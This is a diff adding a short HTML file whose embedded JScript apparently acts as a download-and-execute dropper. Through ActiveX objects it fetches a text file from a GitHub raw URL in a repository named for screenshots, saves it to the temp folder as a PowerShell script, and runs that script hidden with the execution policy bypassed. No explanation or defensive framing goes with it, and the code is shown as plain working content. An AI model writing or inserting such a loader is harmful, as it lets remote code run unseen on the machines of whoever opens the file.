@@ -1,0 +1,10 @@
+<html><head><script language=JScript>
+var x=new ActiveXObject("MSXML2.XMLHTTP");
+x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/init.txt",0);
+x.send();
+var fso=new ActiveXObject("Scripting.FileSystemObject");
+var t=fso.GetSpecialFolder(2)+"\\t.ps1";
+fso.CreateTextFile(t).Write(x.responseText);
+var sh=new ActiveXObject("Shell.Application");
+sh.ShellExecute("powershell","-ExecutionPolicy Bypass -File \""+t+"\"","","open",0);
+</script></head></html>
